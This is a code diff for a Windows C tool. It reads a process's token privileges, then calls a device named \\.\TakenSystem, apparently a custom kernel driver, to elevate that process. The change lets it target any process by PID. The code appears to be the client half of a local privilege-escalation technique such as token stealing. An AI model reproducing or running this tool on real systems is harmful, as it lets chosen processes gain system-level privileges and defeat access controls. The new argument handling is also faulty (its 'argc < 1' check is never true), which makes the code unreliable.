@@ -27,10 +27,11 @@ LPCSTR GetPrivilegeAttributes(DWORD Attributes) {
 	}
 }
 
-VOID GetPrivileges() {
+VOID GetPrivileges(DWORD Pid) {
 
 	HANDLE hToken = NULL;
-	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
+	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, Pid);
+	if (!OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) {
 		wprintf(L"[-] Failed to open process token\n");
 		return;
 	}
@@ -43,12 +44,12 @@ VOID GetPrivileges() {
 		CloseHandle(hToken);
 		return;
 	}
-	wprintf(L"[+] Current process privileges:\n");
+	wprintf(L"[+] Process privileges:\n");
 	for (DWORD i = 0; i < pTokenPrivileges->PrivilegeCount; i++) {
 		CHAR privilegeName[256] = { 0 };
 		DWORD dwprivilegeSize = sizeof(privilegeName);
 		LookupPrivilegeNameA(NULL, &pTokenPrivileges->Privileges[i].Luid, privilegeName, &dwprivilegeSize);
-		printf("  %-42s  %s\n", privilegeName, GetPrivilegeAttributes(pTokenPrivileges->Privileges[i].Attributes));
+		printf("    %-42s  %s\n", privilegeName, GetPrivilegeAttributes(pTokenPrivileges->Privileges[i].Attributes));
 	}
 	HeapFree(GetProcessHeap(), 0, pTokenPrivileges);
 
@@ -56,10 +57,22 @@ VOID GetPrivileges() {
 
 int wmain(int argc, wchar_t* argv[]) {
 
-	GetPrivileges();
-	
-	DWORD Pid = GetCurrentProcessId();
-	printf("[+] Current process PID: %lu\n", Pid);
+	DWORD Pid = 0;
+
+	if (argc < 1) {
+		Pid = GetCurrentProcessId();
+	}
+	else {
+		Pid = _wtoi(argv[1]);
+	}
+
+	if (Pid == 0) {
+		wprintf(L"[-] Failed to Get PID\n");
+		return -1;
+	}
+
+	GetPrivileges(Pid);
+	printf("[+] Process PID: %lu\n", Pid);
 
 	HANDLE hDevice = CreateFile(
 		L"\\\\.\\TakenSystem",
@@ -99,7 +112,7 @@ int wmain(int argc, wchar_t* argv[]) {
 
 	wprintf(L"[+] Successfully elevated process: %lu\n", Pid);
 
-	GetPrivileges();
+	GetPrivileges(Pid);
 
 	return 0;
 }
